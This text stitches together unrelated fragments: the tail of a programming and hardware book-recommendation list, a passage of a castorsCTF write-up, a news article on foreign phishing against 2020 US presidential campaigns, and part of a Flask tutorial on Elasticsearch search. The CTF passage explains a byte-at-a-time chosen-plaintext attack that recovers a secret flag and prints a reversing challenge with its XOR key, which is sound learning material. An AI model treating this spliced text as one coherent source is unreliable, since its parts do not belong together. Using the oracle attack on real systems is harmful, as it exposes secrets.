and Boolean logic. As implied by the\nname, it takes you from [NAND gates](https://en.wikipedia.org/wiki/NAND_gate)\nto a working tetris program.\n\n#### Roth; [Fundamentals of Logic\nDesign](https://www.amazon.com/gp/product/0534378048/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0534378048&linkId=c60cb3be0ffa6e190224ffce81ece8f8)\n\nMuch more detail on gates and logic design than you'll see in nand2tetris. The\nbook is full of exercises and appears to be designed to work for self-study.\nNote that the link above is to the 5th edition. There are newer, more\nexpensive, editions, but they don't seem to be much improved, have a lot of\nerrors in the new material, and are much more expensive.\n\n#### Weste; Harris, and Bannerjee; [CMOS VLSI\nDesign](https://www.amazon.com/gp/product/0321547748/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0321547748&linkId=6019b50b8c3474e0939bd14e6eabf6bb)\n\nOne level below Boolean gates, you get to VLSI, a historical acronym (very\nlarge scale integration) that doesn't really have any meaning today.\n\nBroader and deeper than the alternatives, with clear exposition. Explores the\ndesign space (e.g., the section on adders doesn't just mention a few different\ntypes in an ad hoc way, it explores all the tradeoffs you can make. Also, has\nboth problems and solutions, which makes it great for self study.\n\n#### Kang & Leblebici; CMOS Digital Integrated Circuits\n\nThis was the standard text at Wisconsin way back in the day. It was hard\nenough to follow that the TA basically re-explained pretty much everything\nnecessary for the projects and the exams. I find that it's ok as a reference,\nbut it wasn't a great book to learn from.\n\nCompared to West et al., Weste spends a lot more effort talking about\ntradeoffs in design (e.g., when creating a parallel prefix tree adder, what\ndoes it really mean to be at some particular point in the design space?).\n\n#### Pierret; [Semiconductor Device\nFundamentals](https://www.amazon.com/gp/product/0201543931/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0201543931&linkId=bb2f39f1f5776a37b62a2c7e5841d065)\n\nOne level below VLSI, you have how transistors actually work.\n\nReally beautiful explanation of solid state devices. The text nails the\nfundamentals of what you need to know to really understand this stuff (e.g.,\nband diagrams), and then uses those fundamentals along with clear explanations\nto give you a good mental model of how different types of junctions and\ndevices work.\n\n#### Streetman & Bannerjee; [Solid State Electronic\nDevices](https://www.amazon.com/gp/product/013149726X/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=013149726X&linkId=467c5ec3606c2fd43280ac8b81cc4c44)\n\nCovers the same material as Pierret, but seems to substitute mathematical\nformulas for the intuitive understanding that Pierret goes for.\n\n#### Ida; [Engineering\nElectromagnetics](https://www.amazon.com/gp/product/3319078054/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=3319078054&linkId=700743f63b21bf95abcaa8b4f80dee0d)\n\nOne level below transistors, you have electromagnetics.\n\nTwo to three times thicker than other intro texts because it has more worked\nexamples and diagrams. Breaks things down into types of problems and\nsubproblems, making things easy to follow. For self-study, A much gentler\nintroduction than Griffiths or Purcell.\n\n#### Shanley; [Pentium Pro and Pentium II System\nArchitecture](https://www.amazon.com/gp/product/0201309734/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0201309734&linkId=60d8203080d940d21a7191d5195513a7)\n\nUnlike the other books in this section, this book is about practice instead of\ntheory. It's a bit like Windows Internals, in that it goes into the details of\na real, working, system. Topics include hardware bus protocols, how I/O\nactually works (e.g.,\n[APIC](https://en.wikipedia.org/wiki/Advanced_Programmable_Interrupt_Controller)),\netc.\n\nThe problem with a practical introduction is that there's been an exponential\nincrease in complexity ever since the 8080. The further back you go, the\neasier it is to understand the most important moving parts in the system, and\nthe more irrelevant the knowledge. This book seems like an ok compromise in\nthat the bus and I/O protocols had to handle multiprocessors, and many of the\nelements that are in modern systems were in these systems, just in a simpler\nform.\n\n### Not covered\n\nOf the books that I've liked, I'd say this captures at most 25% of the\nsoftware books and 5% of the hardware books. On average, the books that have\nbeen left off the list are more specialized. This list is also missing many\nentire topic areas, like PL, practical books on how to learn languages,\nnetworking, etc.\n\nThe reasons for leaving off topic areas vary; I don't have any PL books listed\nbecause I don't read PL books. I don't have any networking books because,\nalthough I've read a couple, I don't know enough about the area to really say\nhow useful the books are. The vast majority of hardware books aren't included\nbecause they cover material that you wouldn't care about unless you were a\nspecialist (e.g., [Skew-Tolerant Circuit\nDesign](https://www.amazon.com/gp/product/155860636X/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=155860636X&linkId=495e99808323168df92ec8d4b0b31fca)\nor [Ultrafast\nOptics](https://www.amazon.com/gp/product/0471415391/ref=as_li_qf_sp_asin_il_tl?ie=UTF8&tag=abroaview-20&camp=1789&creative=9325&linkCode=as2&creativeASIN=0471415391&linkId=8087c8c45edba5ee615b4043388c9adf)).\nThe same goes for areas like math and CS theory, where I left off a number of\nbooks that I think are great but have basically zero probability of being\nuseful in my day-to-day programming life, e.g., [Extremal\nCombinatorics](http://www.thi.informatik.uni-\nfrankfurt.de/~jukna/EC_Book_2nd/index.html). I also didn't include books I\ndidn't read all or most of, unless I stopped because the book was atrocious.\nThis means that I don't list classics I haven't finished like SICP and The\nLittle Schemer, since those book seem fine and I just didn't finish them for\none reason or another.\n\nThis list also doesn't include many books on history and culture, like Inside\nIntel or Masters of Doom. I'll probably add more at some point, but I've been\ntrying an experiment where I try to write more like Julia Evans (stream of\nconsciousness, fewer or no drafts). I'd have to go back and re-read the books\nI read 10+ years ago to write meaningful comments, which doesn't exactly fit\nwith the experiment. On that note, since this list is from memory and I got\nrid of almost all of my books a couple years ago, I'm probably forgetting a\nlot of books that I meant to add.\n\n_If you liked this, you might also like Thomas Ptacek's [Application Security\nReading\nList](https://www.amazon.com/gp/richpub/listmania/fullview/R2EN4JTQOCHNBA/ref=cm_lm_pthnk_view?ie=UTF8&lm_bb=)\nor [this list of programming blogs](//danluu.com/programming-blogs/), which is\nwritten in a similar style_\n\n* * *\n\n  1. Also, if you play board games, auction theory explains why fixing game imbalance via an auction mechanism is non-trivial and often makes the game worse. [return]\n  2. I talked to the author of one of these books. He griped that the used book market destroys revenue from textbooks after a couple years, and that authors don't get much in royalties, so you have to charge a lot of money and keep producing new editions every couple of years to make money. That griping goes double in cases where a new author picks up a book classic book that someone else originally wrote, since the original author often has a much larger share of the royalties than the new author, despite doing no work no the later editions.

This allows us to presume\nthat the flag is being concatenated with then input and then hashed into\n16-bit blocks.\n\nWhat this means is that if for example we send a 15-bit string\n(`aaaaaaaaaaaaaaa`), it will be padded with the first bit of the flag and then\nencrypted as a `16 bit` block, so like this: `cipher(input + flag[0])`. So the\nbeginning of the hash will be made of this block.\n\nSo then we can try inputting `aaaaaaaaaaaaaaa` \\+ every printable character,\nand if it is ever equal to the initial block we got with the padding of the\nfirst bit of the flag, then we know that that character is the first character\nof the flag.\n\nTo find the second, we do the same routine except we send a 14-bit string and\nthis time instead of comparing our cipher block to `15-bit string + printable\ncharacter ` we compare it to `14-bit string + portion of flag we have +\nprintable character`.\n\nSo on and so forth until we get the flag, bit by bit.\n\nFlag: `castorsCTF{I_L1k3_muh_b4G3l5_3x7r4_cr15pY}` **SCRIPT TOMORROW**\n\n## Reversing\n\n## Vault1\n\nThe description of this challenge was empty, all we had was the challenge\nfile:\n\n    \n    \n    import base64\n    def xor(s1,s2):\n        return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))\n    \n    def checkpass():\n        _input = input(\"Enter the password: \")\n        key = \"promortyusvatofacidpromortyusvato\"\n        encoded = str.encode(xor(key, _input))\n        result = base64.b64encode(encoded, altchars=None)\n        if result == b'ExMcGQAABzohNQ0TRQwtPidYAS8gXg4kAkcYISwOUQYS':\n            return True\n        else:\n            return False\n    \n    def main():\n        global access\n        access = checkpass()\n        if access:\n            print(\"Yeah...okay.

Biden\nJr.](https://www.nytimes.com/interactive/2020/us/elections/joe-biden.html),\nGoogle said on Thursday, while confirming previous reports that Iran has\ntargeted [President\nTrump](https://www.nytimes.com/interactive/2020/us/elections/donald-\ntrump.html)\u2019s campaign.\n\nIn disclosing the attempts, Google\u2019s chief of threat analysis, Shane Huntley,\nwho oversees the tracking of state-sponsored, sophisticated hacking, said\nthere was no evidence yet that the Chinese hackers had pierced Mr. Biden\u2019s\ncampaign. The attacks appear to be conventional spear-phishing attacks,\nsimilar to the Russian breach of John D. Podesta\u2019s personal emails in 2016,\nwhen he was Hillary Clinton\u2019s campaign chairman.\n\nBut Google\u2019s announcement on Thursday underscored the fact that during the\n2020 election, Russian hackers, who combined hacking and disinformation in the\nlast presidential election cycle, will not be alone. Even before Google\u2019s\nannouncement \u2014 [posted on\nTwitter](https://twitter.com/ShaneHuntley/status/1268589219842109440) \u2014\nsecurity experts warned that Russian hackers would be joined by those from\nother American adversaries.\n\nMr. Biden\u2019s campaign said in a statement that \u201cwe are aware of reports from\nGoogle that a foreign actor has made unsuccessful attempts to access the\npersonal email accounts of campaign staff.\u201d\n\nIt added: \u201cWe have known from the beginning of our campaign that we would be\nsubject to such attacks and we are prepared for them. Biden for President\ntakes cybersecurity seriously, we will remain vigilant against these threats,\nand will ensure that the campaign\u2019s assets are secured.\u201d\n\nThe motivations for such attempts could be many. China already has major\nespionage assets aimed at the Trump administration and other parts of the\nUnited States government, so going after the president\u2019s campaign\ninfrastructure may be redundant \u2014 and less interesting than anything that can\nbe elicited from the Defense Department, the State Department or American\nintelligence agencies.\n\nBut Mr. Biden\u2019s views on China, which have evolved as tensions with Beijing\nhave risen, are more of a mystery to Chinese intelligence.\n\nAnd if Mr. Biden wins, any success at piercing the emails of his top aides\ncould be useful, especially during a transition of power. Google, Microsoft\nand other companies have offered campaigns help in securing both their\nofficial and private accounts, and in enrolling staff members in security\nprograms that are often used by journalists, aid workers or government\nofficials.\n\nGoogle has alerted Gmail users to state-sponsored email threats with automated\nwarnings in recent years, but in this case Google employees personally briefed\nMr. Biden\u2019s campaign on what they called a \u201chigh priority\u201d threat in virtual\nmeetings on Thursday, according to two people familiar with the discussions\nwho were not authorized to discuss them publicly.\n\nThe Chinese interest in campaigns is hardly new. In 2008, Justice Department\nand F.B.I. officials approached Barack Obama\u2019s campaign \u2014 at a time when Mr.\nBiden was chairman of the Senate Foreign Relations Committee and running for\nvice president \u2014 and told the campaign it had been penetrated by Chinese\nhackers. The same hacking groups went after Senator John McCain, the\nRepublican nominee.\n\nBut this time far more is at stake. The relationship between Beijing and\nWashington has never been more tense since relations between the two countries\nopened nearly five decades ago. And Mr. Trump and Mr. Biden are in a match to\ndeclare which one will be tougher on Beijing over its failures to report\nquickly about the coronavirus, its new security laws in Hong Kong, its\ndeclaration of exclusive territory in the South China Sea, and its efforts to\nspread its 5G communications networks around the world.\n\nThe announcement about Iran\u2019s attempts to get into accounts surrounding the\nTrump campaign was not new. In October, Microsoft disclosed [that Iranian\nhackers, with apparent backing from that country\u2019s\ngovernment](https://www.nytimes.com/2019/10/04/technology/iranian-campaign-\nhackers-microsoft.html), made more than 2,700 attempts to identify the email\naccounts of current and former United States government officials, journalists\ncovering political campaigns, and accounts associated with a presidential\ncampaign. While Microsoft didn\u2019t name the campaign, those involved in the\ninvestigation said it was Mr. Trump\u2019s re-election effort. The attacks Google\ndescribed on Thursday appeared to be along similar lines as to what Microsoft\ndetailed.\n\nRussian hackers are also active this election season. In January, the same\nRussian hacking group that stole Mr. Podesta\u2019s emails in 2016 [began a\nphishing campaign against\nBurisma](https://www.nytimes.com/2019/07/25/us/politics/russian-hacking-\nelections.html), the Ukrainian company that formerly employed Mr. Biden\u2019s son\nand was crucial to Mr. Trump\u2019s impeachment.\n\nIt is not clear what the Russian hackers were after, but cybersecurity experts\nsurmised at the time that the hackers were looking for \u201ckompromat\u201d \u2014\ncompromising material on the Bidens \u2014 or hoping to support Mr. Trump\u2019s claim\nthat Burisma was corrupt and that Ukrainian investigations into the company\nwere warranted.\n\nIn February, American intelligence officials warned that Russia was once again\nactively meddling, though it was unclear whether the goal was simply\ndisruption or support for Mr. Trump. This week he [invited President Vladimir\nV. Putin of\nRussia](https://www.nytimes.com/2020/05/30/us/politics/trump-g7-russia.html)\nto join a Group of 7 meeting scheduled for Washington in the fall, angering\nEuropean allies and Canada given that Russia was thrown out of the group after\nit annexed Crimea in 2014.\n\nMr. Biden has been far more critical of Mr. Putin and indicated he would not\nlet up on sanctions against Russia, unlike Mr. Trump.\n\nAnd last month, the National Security Agency [warned that Russian military\nhackers had seized on vulnerabilities in an email transfer\nprogram](https://www.nytimes.com/2020/05/28/us/politics/nsa-russian-hack.html)\n\u2014 used by several congressional candidates, among others \u2014 in yet another\nattempt to steal emails.\n\nAmong those who would have been vulnerable to the Russian attacks were the\ncampaign offices of more than 44 American congressmen, including\nRepresentative Paul Tonko, Democrat of New York, and three members of the\nHouse Armed Services Committee: Jim Banks, Republican of Indiana, Mo Brooks,\nRepublican of Alabama, and Tom Suozzi, Democrat of New York. But there is no\nevidence their emails were stolen, according to a report by Area 1, a Silicon\nValley cybersecurity firm.\n\nDavid Sanger reported from Washington, and Nicole Perlroth from Palo Alto,\nCalif.\n\n# Our 2020 Election Guide\n\nUpdated June 9, 2020\n\n  * * * *\n\n## The Latest\n\n    * Georgia\u2019s primary elections were overwhelmed by a full-scale meltdown of new voting systems, renewing attention on [voting rights in the state](https://www.nytimes.com/2020/06/09/us/politics/atlanta-voting-georgia-primary.html?action=click&pgtype=Article&state=default&module=styln-elections-2020\u00aeion=BELOW_MAIN_CONTENT&context=storylines_guide). \n  * * * *\n\n## Election Results\n\n    * Five states were holding primary elections on Tuesday, including several contests in competitive House districts.

tutorial,\nit's[here](/post/the-flask-mega-tutorial-part-i-hello-world-legacy)._\n\n_Note 2: If you would like to support my work on this blog, or just don't have\npatience to wait for weekly articles, I am offering the complete version of\nthis tutorial packaged as an ebook or a set of videos. For more information,\nvisit[courses.miguelgrinberg.com](https://courses.miguelgrinberg.com)._\n\nThe goal of this chapter is to implement a search feature for Microblog, so\nthat users can find interesting posts using natural language. For many types\nof web sites, it is possible to just let Google, Bing, etc. index all the\ncontent and provide search results through their search APIs. This works well\nfor sites that have mostly static pages, like a forum. But in my application\nthe basic unit of content is a user post, which is a small portion of the\nentire web page. The type of search results that I want are for these\nindividual blog posts and not entire pages. For example, if I search for the\nword \"dog\" I want to see blog posts from any users that include that word.\nObviously a page that shows all blog posts that have the word \"dog\" (or any\nother possible search term) does not really exist as a page that the big\nsearch engines can find and index, so clearly I have no choice other than to\nroll my own search feature.\n\n_The GitHub links for this chapter\nare:[Browse](https://github.com/miguelgrinberg/microblog/tree/v0.16),\n[Zip](https://github.com/miguelgrinberg/microblog/archive/v0.16.zip),\n[Diff](https://github.com/miguelgrinberg/microblog/compare/v0.15...v0.16)._\n\n## Introduction to Full-Text Search Engines\n\nSupport for full-text search is not standardized like relational databases\nare. There are several open-source full-text engines:\n[Elasticsearch](https://www.elastic.co/products/elasticsearch), [Apache\nSolr](http://lucene.apache.org/solr/),\n[Whoosh](http://whoosh.readthedocs.io/), [Xapian](https://xapian.org/),\n[Sphinx](http://sphinxsearch.com/), etc. As if this isn't enough choice, there\nare several databases that also provide searching capabilities that are\ncomparable to dedicated search engines like the ones I enumerated above.\n[SQLite](https://www.sqlite.org), [MySQL](https://www.mysql.com/) and\n[PostgreSQL](https://www.postgresql.org/) all offer some support for searching\ntext, and NoSQL databases such as [MongoDB](https://www.mongodb.com/) and\n[CouchDB](http://couchdb.apache.org/) do too.\n\nIf you are wondering which of these can work within a Flask application, the\nanswer is all of them! That is one of the strengths of Flask, it does its job\nwhile not being opinionated. So what's the best choice?\n\nFrom the list of dedicated search engines, Elasticsearch is one that stands\nout to me as being fairly popular, in part due to its popularity as the \"E\" in\nthe ELK stack for indexing logs, along with Logstash and Kibana. Using the\nsearching capabilities of one of the relational databases could also be a good\nchoice, but given the fact that SQLAlchemy does not support this\nfunctionality, I would have to handle the searching with raw SQL statements,\nor else find a package that provides high-level access to text searches while\nbeing able to coexist with SQLAlchemy.\n\nBased on the above analysis, I'm going to use Elasticsearch, but I'm going to\nimplement all the text indexing and searching functions in a way that is very\neasy to switch to another engine. That will allow you to replace my\nimplementation with an alternative one based on a different engine just by\nrewriting a few functions in a single module.\n\n## Installing Elasticsearch\n\nThere are several ways to install Elasticsearch, including one-click\ninstallers, zip file with the binaries that you need to install yourself, and\neven a Docker image. The documentation has an\n[Installation](https://www.elastic.co/guide/en/elasticsearch/reference/current/install-\nelasticsearch.html) page with detailed information on all these options. If\nyou are using Linux, you will likely have a package available for your\ndistribution. If you are using a Mac and have Homebrew installed, then you can\nsimply run `brew install elasticsearch`.\n\nOnce you install Elasticsearch on your computer, you can verify that it is\nrunning by typing `http://localhost:9200` in your browser's address bar, which\nshould return some basic information about the service in JSON format.\n\nSince I will be managing Elasticsearch from Python, I will also be using the\nPython client library:\n\n    \n    \n    (venv) $ pip install elasticsearch\n    \n\nYou may also want to update your _requirements.txt_ file:\n\n    \n    \n    (venv) $ pip freeze > requirements.txt\n    \n\n## Elasticsearch Tutorial\n\nI'm going to start by showing you the basics of working with Elasticsearch\nfrom a Python shell. This will help you familiarize with this service, so that\nyou can understand the implementation that I will discuss later.\n\nTo create a connection to Elasticsearch, create an instance of class\n`Elasticsearch`, passing a connection URL as an argument:\n\n    \n    \n    >>> from elasticsearch import Elasticsearch\n    >>> es = Elasticsearch('http://localhost:9200')\n    \n\nData in Elasticsearch is written to _indexes_. Unlike a relational database,\nthe data is just a [JSON](http://www.json.org/) object. The following example\nwrites an object with a field called `text` to an index called `my_index`:\n\n    \n    \n    >>> es.index(index='my_index', id=1, body={'text': 'this is a test'})\n    \n\nFor each document stored, Elasticsearch takes a unique id and the JSON object\nwith the data.\n\nLet's store a second document on this index:\n\n    \n    \n    >>> es.index(index='my_index', id=2, body={'text': 'a second test'})\n    \n\nAnd now that there are two documents in this index, I can issue a free-form\nsearch. In this example, I'm going to search for `this test`:\n\n    \n    \n    >>> es.search(index='my_index', body={'query': {'match': {'text': 'this test'}}})\n    \n\nThe response from the `es.search()` call is a Python dictionary with the\nsearch results:\n\n    \n    \n    {\n        'took': 1,\n        'timed_out': False,\n        '_shards': {'total': 5, 'successful': 5, 'skipped': 0, 'failed': 0},\n        'hits': {\n            'total': 2, \n            'max_score': 0.5753642, \n            'hits': [\n                {\n                    '_index': 'my_index',\n                    '_type': 'my_index',\n                    '_id': '1',\n                    '_score': 0.5753642,\n                    '_source': {'text': 'this is a test'}\n                },\n                {\n                    '_index': 'my_index',\n                    '_type': 'my_index',\n                    '_id': '2',\n                    '_score': 0.25316024,\n                    '_source': {'text': 'a second test'}\n                }\n            ]\n        }\n    }\n    \n\nHere you can see that the search returned the two documents, each with an\nassigned score. The document with the highest score contains the two words I\nsearched for, and the other document contains only one. You can see that even\nthe best result does not have a great score, because the words do not exactly\nmatch the text.\n\nNow this is the result if I search for the word `second`:\n\n    \n    \n    >>> es.search(index='my_index', body={'query': {'match': {'text': 'second'}}})\n    {\n        'took': 1,\n        'timed_out': False,\n        '_shards': {'total': 5, 'successful': 5, 'skipped': 0, 'failed': 0},\n        'hits': {\n            'total': 1,\n            'max_score': 0.25316024,\n            'hits': [\n                {\n                    '_index': 'my_index',\n                    '_type': 'my_index',\n                    '_id': '2',\n                    '_score': 0.25316024,\n                    '_source': {'text': 'a second test'}\n                }\n            ]\n        }\n    }\n    \n\nI still get a fairly low score because my search does not match the text in\nthis document, but since only one of the two documents contains the word\n\"second\", the other document does not show up at all.\n\nThe Elasticsearch query object has more options, all well\n[documented](https://www.elastic.co/guide/en/elasticsearch/reference/current/search-\nrequest-body.html), and includes options such as pagination and sorting, just\nlike relational databases.\n\nFeel free to add more entries to this index and try different searches. When\nyou are done experimenting, you can delete the index with the following\ncommand:\n\n    \n    \n    >>> es.indices.delete('my_index')\n    \n\n## Elasticsearch Configuration\n\nIntegrating Elasticsearch into the application is a great example of the power\nof Flask. This is a service and Python package that does not have anything to\ndo with Flask, yet, I'm going to get a pretty good level of integration,\nstarting from the configuration, which I'm going to write in the `app.config`\ndictionary from Flask:\n\n_config.py_ : Elasticsearch configuration.\n\n    \n    \n    class Config(object):\n        # ...\n        ELASTICSEARCH_URL = os.environ.get('ELASTICSEARCH_URL')\n    \n\nLike with many other configuration entries, the connection URL for\nElasticsearch is going to be sourced from an environment variable. If the\nvariable is not defined, I'm going to let the setting be set to `None`, and\nI'll use that as a signal to disable Elasticsearch. This is mainly for\nconvenience, so that you are not forced to always have the Elasticsearch\nservice up and running when you work on the application, and in particular\nwhen you run unit tests. So to make sure the service is used, I need to define\nthe `ELASTICSEARCH_URL` environment variable, either directly in the terminal\nor by adding it to the _.env_ file as follows:\n\n    \n    \n    ELASTICSEARCH_URL=http://localhost:9200\n    \n\nElasticsearch presents the challenge that it isn't wrapped by a Flask\nextension. I cannot create the Elasticsearch instance in the global scope like\nI did in the examples above because to initialize it I need access to\n`app.config`, which only becomes available after the `create_app()` function\nis invoked. So I decided to add a `elasticsearch` attribute to the `app`\ninstance in the application factory function:\n\n_app/__init__.py_ : Elasticsearch instance.\n\n    \n    \n    # ...\n    from elasticsearch import Elasticsearch\n    \n    # ...\n    \n    def create_app(config_class=Config):\n        app = Flask(__name__)\n        app.config.from_object(config_class)\n    \n        # ...\n        app.elasticsearch = Elasticsearch([app.config['ELASTICSEARCH_URL']]) \\\n            if app.config['ELASTICSEARCH_URL'] else None\n    \n        # ...\n    \n\nAdding a new attribute to the `app` instance may seem a little strange, but\nPython objects are not strict in their structure, new attributes can be added\nto them at any time. An alternative that you may also consider is to create a\nsubclass of `Flask` (maybe call it `Microblog`), with the `elasticsearch`\nattribute defined in its `__init__()` function.\n\nNote how I use a [conditional\nexpression](https://docs.python.org/3/reference/expressions.html#conditional-\nexpressions) to make the Elasticsearch instance `None` when a URL for the\nElasticsearch service wasn't defined in the environment.\n\n## A Full-Text Search Abstraction\n\nAs I said in the chapter's introduction, I want to make it easy to switch from\nElasticsearch to other search engines, and I also don't want to code this\nfeature specifically for searching blog posts, I prefer to design a solution\nthat in the future I can easily extend to other models if I need to. For all\nthese reasons, I decided to create an _abstraction_ for the search\nfunctionality. The idea is to design the feature in generic terms, so I will\nnot be assuming that the `Post` model is the only one that needs to be\nindexed, and I will also not be assuming that Elasticsearch is the index\nengine of choice. But if I can't make any assumptions about anything, how can\nI get this work done?\n\nThe first thing that I need, is to somehow find a generic way to indicate\nwhich model and which field or fields in it are to be indexed. I'm going to\nsay that any model that needs indexing needs to define a `__searchable__`\nclass attribute that lists the fields that need to be included in the index.\nFor the `Post` model, these are the changes:\n\n_app/models.py_ : Add a \\\\_\\\\_searchable\\\\_\\\\_ attribute to the Post model.\n\n    \n    \n    class Post(db.Model):\n        __searchable__ = ['body']\n        # ...\n    \n\nSo here I'm saying that this model needs to have its `body` field indexed. But\njust to make sure this is perfectly clear, this `__searchable__` attribute\nthat I added is just a variable, it does not have any behavior associated with\nit. It will just help me write my indexing functions in a generic way.\n\nI'm going to write all the code that interacts with the Elasticsearch index in\na _app/search.py_ module. The idea is to keep all the Elasticsearch code in\nthis module. The rest of the application will use the functions in this new\nmodule to access the index and will not have direct access to Elasticsearch.\nThis is important, because if one day I decided I don't like Elasticsearch\nanymore and want to switch to a different engine, all I need to do is rewrite\nthe functions in this module, and the application will continue to work as\nbefore.\n\nFor this application, I decided that I need three supporting functions related\nto text indexing: I need to add entries to a full-text index, I need to remove\nentries from the index (assuming one day I will support deleting blog posts),\nand I need to execute a search query. Here is the _app/search.py_ module that\nimplements these three functions for Elasticsearch, using the functionality I\nshowed you above from the Python console:\n\n_app/search.py_ : Search functions.\n\n    \n    \n    from flask import current_app\n    \n    def add_to_index(index, model):\n        if not current_app.elasticsearch:\n            return\n        payload = {}\n        for field in model.__searchable__:\n            payload[field] = getattr(model, field)\n        current_app.elasticsearch.index(index=index, id=model.id, body=payload)\n    \n    def remove_from_index(index, model):\n        if not current_app.elasticsearch:\n            return\n        current_app.elasticsearch.delete(index=index, id=model.id)\n    \n    def query_index(index, query, page, per_page):\n        if not current_app.elasticsearch:\n            return [], 0\n        search = current_app.elasticsearch.search(\n            index=index,\n            body={'query': {'multi_match': {'query': query, 'fields': ['*']}},\n                  'from': (page - 1) * per_page, 'size': per_page})\n        ids = [int(hit['_id']) for hit in search['hits']['hits']]\n        return ids, search['hits']['total']['value']\n    \n\nThese functions all start by checking if `app.elasticsearch` is `None`, and in\nthat case return without doing anything. This is so that when the\nElasticsearch server isn't configured, the application continues to run\nwithout the search capability and without giving any errors. This is just as a\nmatter of convenience during development or when running unit tests.\n\nThe functions accept the index name as an argument. In all the calls I'm\npassing down to Elasticsearch, I'm using this name as the index name and also\nas the document type, as I did in the Python console examples.\n\nThe functions that add and remove entries from the index take the SQLAlchemy\nmodel as a second argument. The `add_to_index()` function uses the\n`__searchable__` class variable I added to the model to build the document\nthat is inserted into the index. If you recall, Elasticsearch documents also\nneeded a unique identifier. For that I'm using the `id` field of the\nSQLAlchemy model, which is also conveniently unique. Using the same `id` value\nfor SQLAlchemy and Elasticsearch is very useful when running the searches, as\nit allows me to link entries in the two databases. Something I did not mention\nabove is that if you attempt to add an entry with an existing `id`, then\nElasticsearch replaces the old entry with the new one, so `add_to_index()` can\nbe used for new objects as well as for modified ones.\n\nI did not show you the `es.delete()` function that I'm using in\n`remove_from_index()` before. This function deletes the document stored under\nthe given `id`. Here is a good example of the convenience of using the same\n`id` to link entries in both databases.\n\nThe `query_index()` function takes the index name and a text to search for,\nalong with pagination controls, so that search results can be paginated like\nFlask-SQLAlchemy results are. You have already seen an example usage of the\n`es.search()` function from the Python console. The call I'm issuing here is\nfairly similar, but instead of using a `match` query type, I decided to use\n`multi_match`, which can search across multiple fields. By passing a field\nname of `*`, I'm telling Elasticsearch to look in all the fields, so basically\nI'm searching the entire index. This is useful to make this function generic,\nsince different models can have different field names in the index.\n\nThe `body` argument to `es.search()` includes pagination arguments in addition\nto the query itself. The `from` and `size` arguments control what subset of\nthe entire result set needs to be returned. Elasticsearch does not provide a\nnice `Pagination` object like the one from Flask-SQLAlchemy, so I have to do\nthe pagination math to calculate the `from` value.\n\nThe `return` statement in the `query_index()` function is somewhat complex. It\nreturns two values: the first is a list of `id` elements for the search\nresults, and the second is the total number of results. Both are obtained from\nthe Python dictionary returned by the `es.search()` function. If you are not\nfamiliar with the expression that I'm using to obtain the list of IDs, this is\ncalled a _list comprehension_ , and is a fantastic feature of the Python\nlanguage that allows you to transform lists from one format to another. In\nthis case I'm using the list comprehension to extract the `id` values from the\nmuch larger list of results provided by Elasticsearch.\n\nIs this too confusing? Maybe a demonstration of these functions from the\nPython console can help you understand them a bit more. In the following\nsession, I manually add all the posts from the database to the Elasticsearch\nindex. In my test database, I had a few posts that had the numbers \"one\",\n\"two\", \"three\", \"four\" and \"five\" in them, so I used that as a search query.\nYou may need to adapt your query to match the contents of your database:\n\n    \n    \n    >>> from app.search import add_to_index, remove_from_index, query_index\n    >>> for post in Post.query.all():\n    ...     add_to_index('posts', post)\n    >>> query_index('posts', 'one two three four five', 1, 100)\n    ([15, 13, 12, 4, 11, 8, 14], 7)\n    >>> query_index('posts', 'one two three four five', 1, 3)\n    ([15, 13, 12], 7)\n    >>> query_index('posts', 'one two three four five', 2, 3)\n    ([4, 11, 8], 7)\n    >>> query_index('posts', 'one two three four five', 3, 3)\n    ([14], 7)\n    \n\nThe query that I issued returned seven results. When I asked for page 1 with\n100 items per page I get all seven, but then the next three examples shows how\nI can paginate the results in a way that is very similar to what I did for\nFlask-SQLAlchemy, with the exception that the results come as a list of IDs\ninstead of SQLAlchemy objects.\n\nIf you want to keep things clean, delete the `posts` index after you are doing\nexperimenting with it:\n\n    \n    \n    >>> app.elasticsearch.indices.delete('posts')\n    \n\n## Integrating Searches with SQLAlchemy\n\nThe solution that I showed you in the previous section is decent, but it still\nhas a couple of problems. The most obvious problem is that results come as a\nlist of numeric IDs. This is highly inconvenient, I need SQLAlchemy models so\nthat I can pass them down to templates for rendering, and I need a way to\nreplace that list of numbers with the corresponding models from the database.\nThe second problem is that this solution requires the application to\nexplicitly issue indexing calls as posts are added or removed, which is not\nterrible, but less than ideal, since a bug that causes a missed indexing call\nwhen making a change on the SQLAlchemy side is not going to be easily\ndetected, the two databases will get out of sync more and more each time the\nbug occurs and you will probably not notice for a while. A better solution\nwould be for these calls to be triggered automatically as changes are made on\nthe SQLAlchemy database.\n\nThe problem of replacing the IDs with objects can be addressed by creating a\nSQLAlchemy query that reads those objects from the database. This sounds easy\nin practice, but doing it efficiently with a single query is actually a bit\ntricky to implement.\n\nFor the problem of triggering the indexing changes automatically, I decided to\ndrive updates to the Elasticsearch index from SQLAlchemy _events_. SQLAlchemy\nprovides a large list of\n[events](http://docs.sqlalchemy.org/en/latest/core/event.html) that\napplications can be notified about. For example, each time a session is\ncommitted, I can have a function in the application invoked by SQLAlchemy, and\nin that function I can apply the same updates that were made on the SQLAlchemy\nsession to the Elasticsearch index.\n\nTo implement the solutions to these two problems I'm going to write a _mixin_\nclass. Remember mixin classes? In [Chapter 5](/post/the-flask-mega-tutorial-\npart-v-user-logins), I added the `UserMixin` class from Flask-Login to the\n`User` model, to give it some features that were required by Flask-Login. For\nthe search support I'm going to define my own `SearchableMixin` class, that\nwhen attached to a model, will give it the ability to automatically manage an\nassociated full-text index. The mixin class will act as a \"glue\" layer between\nthe SQLAlchemy and Elasticsearch worlds, providing solutions to the two\nproblems I stated above.\n\nLet me show you the implementation, then I'll go over some interesting\ndetails. 